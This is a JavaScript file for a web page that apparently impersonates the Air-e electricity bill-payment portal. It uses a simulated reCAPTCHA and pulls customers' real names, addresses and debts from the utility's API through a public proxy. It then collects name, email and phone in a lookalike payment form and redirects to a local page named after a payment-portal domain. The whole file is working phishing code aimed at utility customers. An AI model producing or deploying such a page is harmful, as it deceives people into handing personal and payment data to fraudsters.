// --- 1. LÓGICA DE MENÚ (SIDEBAR) ---
const hamburgerBtn = document.getElementById('hamburgerBtn');
const hamburgerBtnDesktop = document.getElementById('hamburgerBtnDesktop'); 
const sidebar = document.getElementById('sidebar');

const toggleSidebar = () => {
    if (window.innerWidth <= 768) sidebar.classList.toggle('mobile-open');
    else sidebar.classList.toggle('hidden');
};

if(hamburgerBtn) hamburgerBtn.addEventListener('click', toggleSidebar);
if(hamburgerBtnDesktop) hamburgerBtnDesktop.addEventListener('click', toggleSidebar);

// --- 2. LÓGICA DE RECAPTCHA (SIMULADO) ---
const checkboxContainer = document.getElementById('checkboxContainer');
const fakeCheckbox = document.getElementById('fakeCheckbox');
const spinner = document.getElementById('spinner');
const checkmark = document.getElementById('checkmark');
let isChecked = false;

if(checkboxContainer){
    checkboxContainer.addEventListener('click', () => {
        if(isChecked) return; 
        fakeCheckbox.style.display = 'none';
        spinner.style.display = 'block';
        setTimeout(() => {
            spinner.style.display = 'none';
            checkmark.style.display = 'block';
            isChecked = true;
        }, 1200);
    });
}

// --- 3. LÓGICA PRINCIPAL DE CONSULTA Y PAGO ---
const btnPagar = document.getElementById('btnPagar');
const whitePanel = document.getElementById('whitePanel');
const originalTitleStrip = document.getElementById('originalTitleStrip');
const inputNic = document.getElementById('inputNicReal');

if(btnPagar) {
    btnPagar.addEventListener('click', async () => {
        // Validaciones iniciales
        if(!inputNic || inputNic.value.trim() === '') {
            alert("Por favor, ingrese el NIC.");
            return;
        }
        if(!isChecked) {
            alert("Por favor confirme que no es un robot.");
            return;
        }

        // Interfaz de carga
        originalTitleStrip.style.display = 'none';
        whitePanel.innerHTML = `
            <div class="full-loader-container">
                <div class="big-loader"></div>
                <p>Consultando deuda...</p>
            </div>`;

        try {
            const nic = inputNic.value.trim();
            const targetUrl = `https://caribesol.facture.co/DesktopModules/Gateway.Pago.ConsultaAnonima/API/ConsultaAnonima/getPolizaOpen?cd_poliza=${nic}`;
            
            // Usamos AllOrigins que es el proxy más compatible con Render
            const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(targetUrl)}&timestamp=${new Date().getTime()}`;

            const resp = await fetch(proxyUrl);
            if (!resp.ok) throw new Error("Error de conexión con el servidor (Estado: " + resp.status + ")");

            const jsonWrapper = await resp.json();
            
            // --- PARSEO INTELIGENTE DE DATOS ---
            let data = jsonWrapper.contents;
            
            // Si el contenido viene como texto, lo convertimos a objeto JSON
            if (typeof data === 'string') {
                try {
                    data = JSON.parse(data);
                } catch (e) {
                    throw new Error("La respuesta del servidor no es un formato válido.");
                }
            }

            console.log("Datos recibidos:", data); // Para depuración en consola

            // Buscamos la información de la cuenta (info)
            let info = data.ACCOUNTS || data; 
            if (Array.isArray(info)) info = info[0];

            // Verificamos si realmente hay datos de cuenta
            if (!info || (!info.ADJUST_BALANCE && info.ADJUST_BALANCE !== 0)) {
                throw new Error("No se encontraron datos para este NIC. Verifique el número e intente de nuevo.");
            }

            const deudaTotalNum = parseFloat(info.ADJUST_BALANCE) || 0;
            const nombreUsuario = data.NAME || info.NAME || "Usuario Air-e";
            
            // Obtener valor del último mes
            let valorMesNum = 0;
            if (info.INVOICES && info.INVOICES.length > 0) {
                const ultimaFactura = info.INVOICES[info.INVOICES.length - 1];
                valorMesNum = parseFloat(ultimaFactura.ADJUST_BALANCE) || 0;
            }

            if (deudaTotalNum > 0) {
                // Renderizamos la vista de la factura
                whitePanel.innerHTML = `
                <div class="invoice-view">
                    <div class="invoice-header"><h3>PAGUE SU FACTURA</h3></div>
                    <div style="text-align:center; padding:10px; background:#f0f4f8; margin-bottom:15px; border-radius:5px;">
                        <strong style="display:block; color:#004a99; text-transform: uppercase;">${nombreUsuario}</strong>
                        <small>${info.COLLECTION_ADDRESS || 'Dirección no disponible'}</small>
                    </div>
                    <div class="invoice-form-grid">
                        <div class="required-note">* Indica campo requerido</div>
                        <div class="invoice-input-group">
                            <label class="invoice-label">No. identificación <span>*</span></label>
                            <input type="text" class="invoice-field" id="numId" value="${nic}">
                        </div>
                        <div class="invoice-input-group">
                            <label class="invoice-label">Nombres <span>*</span></label>
                            <input type="text" class="invoice-field" id="nombres" placeholder="Ej: Juan">
                        </div>
                        <div class="invoice-input-group">
                            <label class="invoice-label">Apellidos <span>*</span></label>
                            <input type="text" class="invoice-field" id="apellidos" placeholder="Ej: Pérez">
                        </div>
                        <div class="invoice-input-group">
                            <label class="invoice-label">Correo <span>*</span></label>
                            <input type="email" class="invoice-field" id="correo" placeholder="correo@ejemplo.com">
                        </div>
                        <input type="hidden" id="tipoId" value="CC">
                        <input type="hidden" id="direccion" value="${info.COLLECTION_ADDRESS || ''}">
                        <div class="invoice-input-group">
                            <label class="invoice-label">Celular <span>*</span></label>
                            <input type="text" class="invoice-field" id="celular" placeholder="3000000000">
                        </div>
                    </div>
                    <div class="payment-cards-grid">
                        <div class="payment-card">
                            <div class="pay-card-title">Valor del mes</div>
                            <div class="pay-card-amount">$ ${valorMesNum.toLocaleString('es-CO')}</div>
                            <button class="btn-card-action btn-blue-dark" onclick="guardarYRedirigir('${valorMesNum}', 'mensual')">PAGAR MES</button>
                        </div>
                        <div class="payment-card">
                            <div class="pay-card-title">Deuda Total</div>
                            <div class="pay-card-amount">$ ${deudaTotalNum.toLocaleString('es-CO')}</div>
                            <button class="btn-card-action btn-teal" onclick="guardarYRedirigir('${deudaTotalNum}', 'total')">PAGAR TOTAL</button>
                        </div>
                    </div>
                    <div class="invoice-footer">
                        <div class="terms-check">
                            <input type="checkbox" id="checkTerm" checked>
                            <span>Acepto políticas de tratamiento de datos personales.</span>
                        </div>
                        <button class="btn-cancel" onclick="location.reload()">VOLVER</button>
                    </div>
                </div>`;
            } else {
                alert("El NIC ingresado no presenta deudas pendientes.");
                location.reload();
            }
        } catch (e) {
            console.error("Error en proceso:", e);
            alert("Error: " + e.message);
            location.reload();
        }
    });
}

// --- 4. FUNCIÓN DE GUARDADO Y REDIRECCIÓN ---
window.guardarYRedirigir = function(monto, tipo) {
    const nom = document.getElementById('nombres').value.trim();
    const ape = document.getElementById('apellidos').value.trim();
    const mail = document.getElementById('correo').value.trim();
    const cel = document.getElementById('celular').value.trim();
    const term = document.getElementById('checkTerm');

    if(!nom || !ape || !mail || !cel) {
        alert("Por favor, complete todos los campos requeridos.");
        return;
    }
    if(!term || !term.checked) {
        alert("Debe aceptar los términos y condiciones.");
        return;
    }

    // Guardamos los datos para la siguiente pantalla
    const datos = {
        nombreCompleto: nom + " " + ape,
        numId: document.getElementById('numId').value,
        correo: mail,
        celular: cel,
        montoPagar: parseInt(monto),
        tipoPago: tipo,
        referencia: "REF-" + Math.floor(Math.random() * 1000000),
        fecha: new Date().toLocaleDateString()
    };
    
    localStorage.setItem('datosFactura', JSON.stringify(datos));
    
    // Redirección al portal de pagos (Asegúrate que el nombre del archivo sea exacto)
    window.location.href = 'portalpagos.portalfacture.com.html';
};
